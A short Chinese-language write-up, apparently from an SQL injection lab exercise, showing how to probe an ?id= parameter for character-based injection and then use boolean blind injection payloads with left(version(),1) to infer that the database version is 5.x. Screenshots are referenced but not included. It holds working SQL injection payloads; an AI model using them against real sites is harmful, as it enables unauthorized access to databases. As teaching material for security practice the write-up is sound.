先尝试确定注入点：

payload:?id=1

![](images/A323A80B77194186988800F35C2096AFclipboard.png)



payload:?id=1'

![](images/070A2C3D20274D1CA90FDB4235852C65clipboard.png)



此时可能存在字符型的注入。

payload:?id=-11'or'1'='1

![](images/EA3FFFA77F2946CAA9097B45DFF48D8Bclipboard.png)

和刚才的页面一样，说明蹴存在注入。



没有回显报错，只有两个页面，此时采用布尔盲注或时间盲注

payload:?id=1'and+left(version(),1)=5--+

![](images/8D7235C1C9A24B03B0ADD1534EA22359clipboard.png)

payload:?id=1'and+left(version(),1)=6--+

![](images/1D4B50325C4E4B4BA30B7A9B19B6E3CAclipboard.png)

此时说明数据库版本为5.几